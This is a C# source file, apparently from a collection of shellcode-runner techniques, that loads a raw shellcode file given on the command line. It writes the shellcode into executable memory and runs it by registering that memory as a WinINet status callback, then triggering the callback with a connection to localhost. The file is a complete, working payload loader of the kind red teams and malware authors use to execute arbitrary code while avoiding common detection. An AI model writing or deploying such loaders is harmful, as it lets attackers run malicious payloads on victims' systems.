// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace InternetSetStatusCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: InternetSetStatusCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            //Initializes use of the WinINet
            int INTERNET_OPEN_TYPE_DIRECT = 1;
            int INTERNET_FLAG_OFFLINE = 0x1000000;
            IntPtr hSession = InternetOpen(string.Empty, INTERNET_OPEN_TYPE_DIRECT, 
                string.Empty, string.Empty, INTERNET_FLAG_OFFLINE);

            //The InternetSetStatusCallback function sets up a callback function that WinINet functions can call as progress is made during an operation.
            InternetSetStatusCallback(hSession, hAlloc);

            //Opens an File Transfer Protocol (FTP) or HTTP session for a given site
            short INTERNET_DEFAULT_HTTPS_PORT = 443;
            int INTERNET_SERVICE_HTTP = 3;
            IntPtr hInternet = InternetConnect(hSession, "localhost", INTERNET_DEFAULT_HTTPS_PORT, 
                string.Empty, string.Empty, INTERNET_SERVICE_HTTP, 0, (IntPtr)1);

            //Cleanup
            InternetCloseHandle(hSession);
            InternetCloseHandle(hInternet);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr InternetOpen(
           string lpszAgent, int dwAccessType, string lpszProxyName,
           string lpszProxyBypass, int dwFlags);

        [DllImport("Wininet.dll")]
        static extern IntPtr InternetSetStatusCallback(
            IntPtr hInternet,
            IntPtr lpfnInternetCallback);

        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr InternetConnect(
           IntPtr hInternet, string lpszServerName, short nServerPort,
           string lpszUsername, string lpszPassword, int dwService,
           int dwFlags, IntPtr dwContext);

        [DllImport("wininet.dll", SetLastError = true)]
        static extern bool InternetCloseHandle(IntPtr hInternet);

    }
}
